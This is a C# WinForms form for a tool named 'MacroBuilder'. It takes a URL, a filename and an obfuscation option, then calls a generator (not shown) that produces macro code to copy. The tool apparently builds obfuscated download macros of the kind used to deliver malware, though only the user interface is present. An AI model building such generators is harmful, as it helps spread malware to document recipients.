using MacroBuilder.Core;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace MacroBuilder
{
    public partial class Main : Form
    {
        private bool isDragging = false;
        private Point lastCursor;
        private Point lastForm;

        public Main()
        {
            InitializeComponent();
        }

        private void GenerateBtn_Click(object sender, EventArgs e)
        {
            string
                url = UrlBox.Text,
                filename = FilenameBox.Text;

            bool obfuscate = ObfuscateChk.Checked;


            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(filename))
            {
                MessageBox.Show("Fields cannot be empty!", "Builder Informer", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }
            if (MacroResult_Box.Text != null)
            {
                MacroResult_Box.Clear();
            }

            MacroResult_Box.Text = MacroGenerator.GenerateMacroCode(url, filename, obfuscate);
        }

        private void CopyBtn_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(MacroResult_Box.Text))
            {
                Clipboard.SetText(MacroResult_Box.Text);
            }
        }

        private void Main_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                lastCursor = Cursor.Position;
                lastForm = Location;
            }
        }

        private void Main_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                int deltaX = Cursor.Position.X - lastCursor.X;
                int deltaY = Cursor.Position.Y - lastCursor.Y;
                Location = new Point(lastForm.X + deltaX, lastForm.Y + deltaY);
            }
        }
        private void Main_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = false;
            }
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void MinimazeBtn_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            UrlBox.Clear(); FilenameBox.Clear(); MacroResult_Box.Clear();
        }
    }
}
